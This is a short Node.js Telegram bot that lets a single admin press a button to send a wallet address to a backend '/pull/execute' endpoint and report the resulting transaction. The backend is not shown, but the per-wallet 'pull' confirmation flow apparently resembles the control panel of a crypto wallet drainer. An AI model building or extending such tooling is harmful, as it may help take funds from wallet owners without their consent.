import TelegramBot from "node-telegram-bot-api";
import dotenv from "dotenv";
import axios from "axios";
dotenv.config();

const token = process.env.TELEGRAM_BOT_TOKEN;
const adminId = process.env.TELEGRAM_ADMIN_ID;
const backendUrl = process.env.BACKEND_URL || "http://localhost:3000";

const bot = new TelegramBot(token, { polling: true });

// Listen for callback queries
bot.on("callback_query", async (callbackQuery) => {
  try {
    const data = callbackQuery.data; // e.g., 'pull:0xabc...'
    const fromId = callbackQuery.from.id;
    const messageId = callbackQuery.message.message_id;
    const chatId = callbackQuery.message.chat.id;

    if (String(fromId) !== String(adminId)) {
      return bot.answerCallbackQuery(callbackQuery.id, { text: "Unauthorized" });
    }

    if (data.startsWith("pull:")) {
      const wallet = data.split(":")[1];
      // Call backend pull endpoint
      const res = await axios.post(`${backendUrl}/pull/execute`, { wallet });
      if (res.data.ok) {
        bot.sendMessage(chatId, `Pull initiated for ${wallet}\nTx: ${res.data.tx}`);
      } else {
        bot.sendMessage(chatId, `Pull failed: ${res.data.error || JSON.stringify(res.data)}`);
      }
      // Optionally remove inline keyboard to avoid double press
      await bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: chatId, message_id: messageId });
      bot.answerCallbackQuery(callbackQuery.id, { text: "Pull requested" });
    } else if (data.startsWith("ignore:")) {
      // remove keyboard
      await bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: chatId, message_id: messageId });
      bot.answerCallbackQuery(callbackQuery.id, { text: "Ignored" });
    } else {
      bot.answerCallbackQuery(callbackQuery.id, { text: "Unknown" });
    }
  } catch (e) {
    console.error("callback err", e);
  }
});

// /start handler
bot.onText(/\/start/, (msg) => {
  if (String(msg.from.id) !== String(adminId)) return;
  bot.sendMessage(msg.chat.id, "Admin bot ready.");
});

console.log("Bot started");
